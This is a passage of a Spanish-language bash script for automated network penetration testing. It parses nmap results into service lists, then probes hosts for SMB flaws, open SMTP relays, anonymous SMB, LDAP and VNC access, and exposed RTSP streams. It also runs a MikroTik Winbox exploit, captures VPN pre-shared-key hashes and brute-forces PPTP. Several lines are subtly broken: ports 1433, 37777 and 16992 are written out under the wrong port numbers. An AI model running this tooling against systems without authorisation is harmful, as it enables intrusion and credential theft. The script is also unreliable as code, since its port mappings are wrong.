	grep ' 1526/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1526\n"' | sort | sort | uniq >> ../.servicios/informix.txt	
	
	
	grep ' 1521/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1521\n"' | sort | sort | uniq >> ../.servicios/oracle.txt
	grep ' 1630/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1630\n"' | sort | sort | uniq >> ../.servicios/oracle.txt
	grep ' 5432/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5432\n"' | sort | sort | uniq >> ../.servicios/postgres.txt     
	grep ' 3306/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3306\n"' | sort | sort | uniq >> ../.servicios/mysql.txt 
	grep ' 27017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27017\n"' >> ../.servicios/mongoDB.txt 
	grep ' 28017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:28017\n"' >> ../.servicios/mongoDB.txt 
	grep ' 27080/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27080\n"' >> ../.servicios/mongoDB.txt 
	grep ' 5984/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5984\n"' >> ../.servicios/couchDB.txt 
	grep ' 6379/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6379\n"' >> ../.servicios/redis.txt 
	grep ' 9000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9000\n"' >> ../.servicios/Hbase.txt 
	grep ' 9160/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9160\n"' >> ../.servicios/cassandra.txt 
	grep ' 7474/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:7474\n"' >> ../.servicios/neo4j.txt 
	grep ' 8098/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8098\n"' >> ../.servicios/riak.txt 
        
    
	# remote desk
	grep ' 3389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3389\n"' >> ../.servicios/rdp.txt
	grep ' 4899/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4899\n"' >> ../.servicios/radmin.txt  
	grep ' 5800/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5800\n"' >> ../.servicios/vnc-http.txt
	grep ' 5900/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5900\n"' >> ../.servicios/vnc.txt
	grep ' 5901/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5901\n"' >> ../.servicios/vnc.txt
   
   	#Virtual
	grep ' 902/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:902\n"' >> ../.servicios/vmware.txt	
	grep ' 1494/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1494\n"' >> ../.servicios/citrix.txt    

   	#Virtual
	grep ' 8291/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8291\n"' | sort | uniq >> ../.servicios/winbox.txt	
		  
		
	#Misc      
	grep ' 6000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6000\n"' >> ../.servicios/x11.txt
	grep ' 631/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:631\n"' >> ../.servicios/cups.txt
	grep ' 9100/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:9100\n"' >> ../.servicios/printers.txt	
	grep ' 2049/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:2049\n"' >> ../.servicios/nfs.txt
	grep ' 5723/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5723\n"' >> ../.servicios/SystemCenter.txt
	grep ' 5724/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5724\n"' >> ../.servicios/SystemCenter.txt
	grep ' 1099/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1099\n"' >> ../.servicios/rmi.txt
	grep ' 1433/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1434\n"' | sort | uniq >> ../.servicios/mssql.txt 
	grep ' 37777/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3777\n"' >> ../.servicios/dahua-dvr.txt
	grep ' 9200/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9200\n"' >> ../.servicios/elasticsearch.txt 	
	grep ' 3221/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3221\n"' >> ../.servicios/juniper.txt 	
	
	
	
	#Esp
	grep ' 16992/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1434\n"' >> ../.servicios/intel.txt 	
	grep ' 5601/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5601\n"' >> ../.servicios/kibana.txt 	
	
	grep ' 47808/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:47808\n"' >> ../.servicios/scada.txt 	
	grep ' 502/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:502\n"' >> ../.servicios/scada.txt 	
	
	#backdoor
	grep ' 32764/open' nmap-tcp.grep | awk '{print $2}'  >> ../.servicios/backdoor32764.txt
	
	#pptp
	grep ' 1723/open' nmap-tcp.grep | awk '{print $2}'  >> ../.servicios/pptp.txt
		
	cd ..
fi
    
  
  
 ##################UDP#########
if [[ $TYPE = "completo" ]] || [ $udp_escaneando == "s" ]; then 
	cd .nmap
	grep "53/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:53\n"' >> ../.servicios/dns.txt
	
	grep "161/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/snmp2.txt	
	grep '161/udp' ../.masscan/* 2>/dev/null| cut -d " " -f 6 >> ../.servicios/snmp2.txt
	
	grep "67/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/dhcp2.txt	
	grep '67/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../.servicios/dhcp2.txt
	sort ../.servicios/dhcp2.txt | sort | uniq >../.servicios/dhcp.txt; rm ../.servicios/dhcp2.txt
	
	grep "500/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/vpn2.txt
	grep '500/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../.servicios/vpn2.txt
	sort ../.servicios/vpn2.txt | sort | uniq >../.servicios/vpn.txt; rm ../.servicios/vpn2.txt
		
	
	grep "1604/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1604\n"' >> ../.servicios/citrix.txt
	grep "1900/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1900\n"' >> ../.servicios/upnp.txt
	cd ../
fi
        
find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
 ################################
  
   
echo -e "########################################### "


fi #enumerar

# FASE: 3
echo -e "\n\n$OKYELLOW [+] FASE 3: ENUMERACION DE PUERTOS E IDENTIFICACION DE VULNERABILIDADES \n $RESET"
###################################  ENUMERACION ########################################

if [ -f .servicios/smtp.txt ]
	then
		echo -e "$OKBLUE #################### SMTP (`wc -l .servicios/smtp.txt`) ######################$RESET"	    
		while read line
		do  	
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			
			echo -e "[+] Escaneando $ip:$port"
			
			########## Banner #######
			echo -e "\t[+] Obtenindo banner"
			nc -w 3 $ip $port <<<"EHLO localhost"  &> .enumeracion/$ip-$port-EHLO.txt					
						
			########## VRFY #######
			echo -e "\t[+] Comprobando comando vrfy"
			vrfy-test.py $ip $port $DOMAIN > logs/vulnerabilidades/$ip-$port-vrfy.txt 
			egrep -iq "User unknown" logs/vulnerabilidades/$ip-$port-vrfy.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Comando VRFY habilitado \n $RESET"
				cp logs/vulnerabilidades/$ip-$port-vrfy.txt  .vulnerabilidades/$ip-$port-vrfy.txt 				
				echo -e "\t[+] Enumerando usuarios en segundo plano"
				smtp-user-enum -M VRFY -U /usr/share/wordlists/usuarios-es.txt -t $ip > logs/vulnerabilidades/$ip-$port-vrfyEnum.txt &
				
			else
				echo -e "\t$OKGREEN[ok] No tiene el comando VRFY habilitado $RESET"
			fi		
			#########################
			
			########## open relay #######
			echo ""
			echo -e "\t[+] Probando si es un open relay"
			open-relay.py $ip $port $DOMAIN > logs/vulnerabilidades/$ip-$port-openrelay.txt 2>/dev/null 
			sleep 5							
			
			egrep -iq "JunkMail rejected|REGISTER IN BLACK" logs/vulnerabilidades/$ip-$port-openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] No se pudo completar la prueba (Nuestra IP esta en lista negra)$RESET"
			fi
			
			egrep -iq "No Such User Here" logs/vulnerabilidades/$ip-$port-openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] No se pudo completar la prueba (No existe el usuario destinatario)$RESET"
			fi
					
			egrep -iq "queued as|250 OK id=" logs/vulnerabilidades/$ip-$port-openrelay.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Open Relay detectado \n $RESET"
				cp logs/vulnerabilidades/$ip-$port-openrelay.txt  .vulnerabilidades/$ip-$port-openrelay.txt 
			else
				echo -e "\t$OKGREEN[ok] No es un open relay $RESET"
				
			fi		
			#########################
													
 			echo ""
		done <.servicios/smtp.txt				
	insert_data	
fi

if [ -f .servicios/smb.txt ]
then  
	echo -e "$OKBLUE #################### SMB (`wc -l .servicios/smb.txt`) ######################$RESET"	
	mkdir -p .smbinfo/
	for ip in $(cat .servicios/smb.txt); do									
		echo -e "[+] Escaneado $ip " 					
		#,smb-vuln-ms10-061,,smb-vuln-ms06-025,smb-vuln-ms07-029 		
		echo "nmap -n -p445 --script smb-vuln-ms08-067 $ip" >> logs/vulnerabilidades/$ip-445-ms08067.txt 2>/dev/null
		nmap -n -p445 --script smb-vuln-ms08-067 $ip >> logs/vulnerabilidades/$ip-445-ms08067.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-445-ms08067.txt | egrep -v "ACCESS_DENIED|false" > .vulnerabilidades/$ip-445-ms08067.txt  		
		
		echo "nmap -n -p445 --script smb-vuln-ms17-010 $ip" > logs/vulnerabilidades/$ip-445-ms17010.txt 2>/dev/null
		nmap -n -p445 --script smb-vuln-ms17-010 $ip >> logs/vulnerabilidades/$ip-445-ms17010.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-445-ms17010.txt | egrep -v "ACCESS_DENIED|false|Could" > .vulnerabilidades/$ip-445-ms17010.txt  
		
		echo "nmap -n -p445 --script smb-double-pulsar-backdoor $ip" > logs/vulnerabilidades/$ip-445-doublepulsar.txt 2>/dev/null
		nmap -n -p445 --script smb-double-pulsar-backdoor $ip >> logs/vulnerabilidades/$ip-445-doublepulsar.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-445-doublepulsar.txt | egrep -v "ACCESS_DENIED|false|Could" > .vulnerabilidades/$ip-445-doublepulsar.txt  
		
		echo "nmap -n -p445 --script smb-vuln-conficker $ip" > logs/vulnerabilidades/$ip-445-conficker.txt 2>/dev/null
		nmap -n -p445 --script smb-vuln-conficker $ip >> logs/vulnerabilidades/$ip-445-conficker.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-445-conficker.txt | egrep -v "ACCESS_DENIED|false|Could" > .vulnerabilidades/$ip-445-conficker.txt  							
		
		echo "smbmap -H $ip -u anonymous -p anonymous" > logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
		smbmap -H $ip -u anonymous -p anonymous >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
		egrep --color=never "READ|WRITE" logs/vulnerabilidades/$ip-445-compartido.txt > .vulnerabilidades/$ip-445-compartido2.txt
		echo ""  >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
		
		echo "smbmap -H $ip"  >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
		smbmap -H $ip  >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
		egrep --color=never "READ|WRITE" logs/vulnerabilidades/$ip-445-compartido.txt >> .vulnerabilidades/$ip-445-compartido2.txt
		
		sort .vulnerabilidades/$ip-445-compartido2.txt | uniq | grep -v "\$"> .vulnerabilidades/$ip-445-compartidoSMB.txt
		rm .vulnerabilidades/$ip-445-compartido2.txt
			
		########## making reportes #######
		echo -e "[+] Obteniendo OS/dominio" 		
		cp $live_hosts .smbinfo/
		nmap -n -Pn --script smb-os-discovery.nse -p445 $ip | grep "|"> .smbinfo/$ip.txt	

		################################										
	done
		echo -e "[+] Creando reporte (OS/dominio/users)"
		cd .smbinfo/
		report-OS-domain.pl total-host-vivos.txt 2>/dev/null
		cd ..
	
	#insert clean data	
	insert_data
fi

# windows 
grep -i windows reportes/reporte-OS.txt 2> /dev/null | cut -d ";" -f 1 >> .servicios/Windows.txt

# servers
egrep -i "server|unix" reportes/reporte-OS.txt 2>/dev/null | cut -d ";" -f1 >> .servicios/servers2.txt
cat .servicios/ldap.txt 2>/dev/null | cut -d ":" -f1 >> .servicios/servers2.txt 2>/dev/null 
sort .servicios/servers2.txt | uniq > .servicios/servers.txt
rm .servicios/servers2.txt

find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files

#####################################


if [ -f .servicios/camaras-ip.txt ]
then
	echo -e "$OKBLUE #################### Camaras IP (`wc -l .servicios/camaras-ip.txt`) ######################$RESET"	  
	for line in $(cat .servicios/camaras-ip.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
						
		echo -e "[+] Escaneando $ip:$port"		
		egrep -iq $ip .servicios/Windows.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t[i] Es un dispositivo windows"			
		else
			echo -e "\t[+] Testeando open stream"
			echo "nmap -n -sV -p 554 --script=rtsp-url-brute $ip" > logs/vulnerabilidades/$ip-554-openstreaming.txt 2>/dev/null 
			nmap -n -sV -p 554 --script=rtsp-url-brute $ip >> logs/vulnerabilidades/$ip-554-openstreaming.txt 2>/dev/null 
			egrep -iq "discovered" logs/vulnerabilidades/$ip-554-openstreaming.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Open stream detectado \n $RESET"
				cp logs/vulnerabilidades/$ip-554-openstreaming.txt  .vulnerabilidades/$ip-554-openstreaming.txt 		
			else
				echo -e "\t$OKGREEN[i] No es un Open stream $RESET"
			fi								
		fi			
		
	done
	insert_data		
fi



if [ -f .servicios/pptp.txt ]
then
	echo -e "$OKBLUE #################### pptp (`wc -l .servicios/pptp.txt`) ######################$RESET"
	for line in $(cat .servicios/pptp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip"
		touch pass.txt
		echo "thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt"  > logs/enumeracion/$ip-pptp-hostname.txt 2>/dev/null 
		thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt  >> logs/enumeracion/$ip-pptp-hostname.txt 2>/dev/null 
		grep "Hostname" logs/enumeracion/$ip-pptp-hostname.txt > .enumeracion/$ip-pptp-hostname.txt 				
		rm pass.txt
	done
	
	#insert clean data	
	insert_data	
fi

if [ -f .servicios/mongoDB.txt ]
then
	echo -e "$OKBLUE #################### MongoDB (`wc -l .servicios/mongoDB.txt`) ######################$RESET"
	for line in $(cat .servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -n -sV -p $port -Pn --script=mongodb-databases $ip"  > logs/vulnerabilidades/$ip-mongodb-databases.txt 2>/dev/null 
		nmap -n -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/$ip-mongodb-databases.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/$ip-mongodb-databases.txt > .vulnerabilidades/$ip-mongodb-databases.txt 				
	done
	
	#insert clean data	
	insert_data	
fi


if [ -f .servicios/couchDB.txt ]
then
	echo -e "$OKBLUE #################### couchDB (`wc -l .servicios/couchDB.txt`)  ######################$RESET"
	for line in $(cat .servicios/couchDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -Pn -n -sV -p $port --script=couchdb-databases $ip" >> logs/vulnerabilidades/$ip-couchdb-databases.txt 2>/dev/null
		nmap -Pn -n -sV -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/$ip-couchdb-databases.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-couchdb-databases.txt > .vulnerabilidades/$ip-couchdb-databases.txt 
	done
	
	#insert clean data	
	insert_data	
fi

######################################

if [ -f .servicios/x11.txt ]
then
	echo -e "$OKBLUE #################### X11 (`wc -l .servicios/x11.txt`)  ######################$RESET"	  
	for line in $(cat .servicios/x11.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"		
		echo "nmap -Pn -n $ip --script=x11-access.nse" > logs/vulnerabilidades/$ip-x11-access.txt 2>/dev/null 
		nmap -Pn -n $ip --script=x11-access.nse >> logs/vulnerabilidades/$ip-x11-access.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/$ip-x11-access.txt | grep -v ERROR > .vulnerabilidades/$ip-x11-access.txt 
	done	
	
	#insert clean data	
	insert_data
fi

if [ -f .servicios/rpc.txt ]
then
	echo -e "$OKBLUE #################### RPC (`wc -l .servicios/rpc.txt`)  ######################$RESET"	  
	for line in $(cat .servicios/rpc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"		
		echo "nmap -n -p $port $ip --script=nfs-ls.nse" > logs/vulnerabilidades/$ip-rpc-nfs.txt 2>/dev/null 
		nmap -Pn -n -p $port $ip --script=nfs-ls.nse >> logs/vulnerabilidades/$ip-rpc-nfs.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/$ip-rpc-nfs.txt > .vulnerabilidades/$ip-rpc-nfs.txt 
		
		echo "nmap -n -p $port $ip --script=rpcinfo" > logs/enumeracion/$ip-rpc-info.txt 2>/dev/null 
		nmap -Pn -n -p $port $ip --script=rpcinfo >> logs/enumeracion/$ip-rpc-info.txt 2>/dev/null 
		grep "|" logs/enumeracion/$ip-rpc-info.txt > .enumeracion/$ip-rpc-info.txt
		
	done	
	
	#insert clean data	
	insert_data	
fi



if [ -f .servicios/winbox.txt ]
then	
	echo -e "$OKBLUE #################### winbox (`wc -l .servicios/winbox.txt`) ######################$RESET"	    
	for line in $(cat .servicios/winbox.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"					
		WinboxExploit.py $ip > logs/vulnerabilidades/$ip-8291-winboxVuln.txt 2>/dev/null
		
		egrep -iq "Exploit successful" logs/vulnerabilidades/$ip-8291-winboxVuln.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t$OKRED[i] Mikrotik vulnerable $RESET"
			cat logs/vulnerabilidades/$ip-8291-winboxVuln.txt | egrep -v "Connected|successful" > .vulnerabilidades/$ip-8291-winboxVuln.txt 								
		fi				
		
	done
	
	#insert clean data	
	insert_data	
fi





if [ -f .servicios/redis.txt ]
then	
	echo -e "$OKBLUE #################### Redis (`wc -l .servicios/redis.txt`) ######################$RESET"	    
	for line in $(cat .servicios/redis.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"			
		echo "nmap -n -p $port $ip --script redis-info" > logs/enumeracion/$ip-redis.txt 2>/dev/null
		nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/$ip-redis.txt 2>/dev/null
		grep "|" logs/enumeracion/$ip-redis.txt  > .enumeracion/$ip-redis.txt						
	done
	
	#insert clean data	
	insert_data	
fi

if [ -f .servicios/rmi.txt ]
then	
	echo -e "$OKBLUE #################### RMI (`wc -l .servicios/rmi.txt`) ######################$RESET"	    
	for line in $(cat .servicios/rmi.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -n -p $port $ip --script rmi-vuln-classloader" > logs/vulnerabilidades/$ip-rmi-vuln.txt 2>/dev/null
		nmap -Pn -n -p $port $ip --script rmi-vuln-classloader >> logs/vulnerabilidades/$ip-rmi-vuln.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-rmi-vuln.txt  | egrep -v "ERROR" > .vulnerabilidades/$ip-rmi-vuln.txt
		
	done
	
	#insert clean data	
	insert_data
fi



if [ -f .servicios/telnet.txt ]
then
	echo -e "$OKBLUE #################### TELNET (`wc -l .servicios/telnet.txt`)######################$RESET"	    
	while read line; do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		
		echo -e "\t[+] Obteniendo banner"	
		echo -e "\tquit" | nc -w 4 $ip $port | strings > .enumeracion/$ip-$port-banner.txt 2>/dev/null				

		 echo ""
 	done <.servicios/telnet.txt
		
	#insert clean data	
	insert_data
fi # telnet


if [ -f .servicios/ssh.txt ]
then
	echo -e "$OKBLUE #################### SSH (`wc -l .servicios/ssh.txt`)######################$RESET"	    
	while read line; do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"
		
		#SSHBypass
		echo -e "\t[+] Obtener banner"
		echo -e "\tquit" | nc -w 4 $ip $port | strings | uniq> .enumeracion/$ip-$port-banner.txt 2>/dev/null
		grep --color=never "libssh" .enumeracion/$ip-$port-banner.txt > .vulnerabilidades/$ip-$port-SSHBypass.txt 
				
		 echo ""
 	done <.servicios/ssh.txt
		
	#insert clean data	
	insert_data
fi # ssh



if [ -f .servicios/finger.txt ]
then
	echo -e "$OKBLUE #################### FINGER ######################$RESET"	    
	while read line; do
		ip=`echo $line | cut -f1 -d";"`		
		echo -e "[+] Escaneando $ip:$port"		
		finger @$ip > .enumeracion/$ip-69-users.txt &
		sleep 1
					# done true				        	        				
	done < .servicios/finger.txt
	
	# revisar si hay scripts ejecutandose
	while true; do
	finger_instancias=`ps aux | egrep 'finger|nmap' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($finger_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	
	#insert clean data	
	insert_data
		
fi

if [ -f .servicios/vpn.txt ]
then
	echo -e "$OKBLUE #################### VPN (`wc -l .servicios/vpn.txt`) ######################$RESET"	    
	for ip in $(cat .servicios/vpn.txt); do		
			
		echo -e "[+] Escaneando $ip:500"
		echo -e "\t[+] Probando si el modo agresivo esta habilitado "
		ike=`ike-scan -M $ip 2>/dev/null`
		if [[ $ike == *"HDR"* ]]; then
			echo -e "\t$OKRED[!] Modo agresivo detectado \n $RESET"
			echo $ike > .enumeracion/$ip-vpn-transforms.txt
			cp .enumeracion/$ip-vpn-transforms.txt logs/enumeracion/$ip-vpn-transforms.txt					
			ike-scan --aggressive --multiline --id=vpn --pskcrack=.vulnerabilidades/$ip-vpn-handshake.txt $ip > logs/vulnerabilidades/$ip-vpn-agresivo.txt 2>/dev/null ;						
		fi			
	done
	#insert clean data	
	insert_data
fi


if [ -f .servicios/vnc.txt ]
then
	echo -e "$OKBLUE #################### VNC (`wc -l .servicios/vnc.txt`) ######################$RESET"	    
	for line in $(cat .servicios/vnc.txt); do		
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"			
		#vnc_response=`echo -e "\ta" | nc -w 3 $ip $port`
		#if [[ ${vnc_response} == *"RFB 003.008"* ]];then
			#echo -e "\tVNC bypass ($vnc_response)" > .vulnerabilidades/$ip-$port-bypass.txt 
		#fi	
		echo -e "\t[+] Verificando autenticación"
		msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth;set RHOSTS $ip; set rport $port;run;exit" > logs/vulnerabilidades/$ip-$port-VNCnopass.txt 2>/dev/null		
		egrep --color=never -i "None" logs/vulnerabilidades/$ip-$port-VNCnopass.txt  > .vulnerabilidades/$ip-$port-VNCnopass.txt 
		
		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
		echo "nmap -n -p $port --script realvnc-auth-bypass $ip" > logs/vulnerabilidades/$ip-$port-VNCbypass.txt 2>/dev/null
		nmap -Pn -n -p $port --script realvnc-auth-bypass $ip >> logs/vulnerabilidades/$ip-$port-VNCbypass.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-$port-VNCbypass.txt > .vulnerabilidades/$ip-$port-VNCbypass.txt
	done
	
	#insert clean data	
	insert_data
fi


# enumerar MS-SQL
if [ -f .servicios/mssql.txt ]
then
	echo -e "$OKBLUE #################### MS-SQL (`wc -l .servicios/mssql.txt`) ######################$RESET"	    
	while read line           
	do   	
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Obteniendo información de MS-SQL"
		nmap -sU -n -sV -p 1434 --host-timeout 10s --script ms-sql-info $ip > logs/enumeracion/$ip-1434-info.txt  2>/dev/null
		grep "|" logs/enumeracion/$ip-1434-info.txt  > .enumeracion/$ip-1434-info.txt 
					
		 echo ""
 	done <.servicios/mssql.txt
 		
	#insert clean data	
	insert_data
fi
		

#LDAPS
if [ -f .servicios/ldaps.txt ]
then
	echo -e "$OKBLUE #################### LDAPS (`wc -l .servicios/ldaps.txt`) ######################$RESET"	    
	while read line       
	do     					
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	

		echo -e "\t[+] Obteniendo dominio"				
		dominio=`nmap -n -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
				
		if [ -z "$dominio" ]; then
			dominio=`nmap -n -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
		fi
		
		if [ -z "$dominio" ]; then
			echo -e "\t[i] No se pudo obtener el dominio"
		else
			echo $dominio > .enumeracion/$ip-$port-dominio.txt			
			echo -e "\t[+] Comprobando acceso anónimo"
			echo "ldapsearch -x -p $port -h $ip -b $dominio -s sub \"(objectclass=*)\"" > logs/enumeracion/$ip-$port-directorioLDAP.txt 
			ldapsearch -x -p $port -h $ip -b $dominio -s sub "(objectclass=*)" >> logs/enumeracion/$ip-$port-directorioLDAP.txt 
			#ldapsearch -x -s base -b '' -H  ldap://my.lapdap.server "(objectClass=*)" "*" +  
			egrep -iq "successful bind must be completed|Not bind|Invalid DN syntax|Can't contact LDAP server" logs/enumeracion/$ip-$port-directorioLDAP.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
			else
				cp logs/enumeracion/$ip-$port-directorioLDAP.txt .vulnerabilidades/$ip-$port-directorioLDAP.txt 
				echo -e "\t$OKRED[!] Acceso anónimo detectado \n $RESET"
			fi
		
		fi #fin sin dominio
		
													 
		 echo ""
 	done <.servicios/ldaps.txt
	
	#insert clean data	
	insert_data
fi


#CITRIX
if [ -f .servicios/citrix.txt ]
then
	echo -e "$OKBLUE #################### citrix (`wc -l .servicios/citrix.txt`) ######################$RESET"	    
	while read line       
	do     				
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Enumerando aplicaciones y dato del servidor"
		nmap -n -sU --script=citrix-enum-apps -p 1604 $ip > logs/enumeracion/$ip-citrix-app.txt 2>/dev/null
		nmap -n -sU --script=citrix-enum-servers -p 1604  $ip > logs/enumeracion/$ip-citrix-servers.txt 2>/dev/null
		
		grep "|" logs/enumeracion/$ip-citrix-app.txt | egrep -v "ERROR|filtered" > .enumeracion/$ip-citrix-app.txt 
		grep "|" logs/enumeracion/$ip-citrix-servers.txt | egrep -v "ERROR|filtered" > .enumeracion/$ip-citrix-servers.txt 
													 
		 echo ""
 	done <.servicios/citrix.txt
		
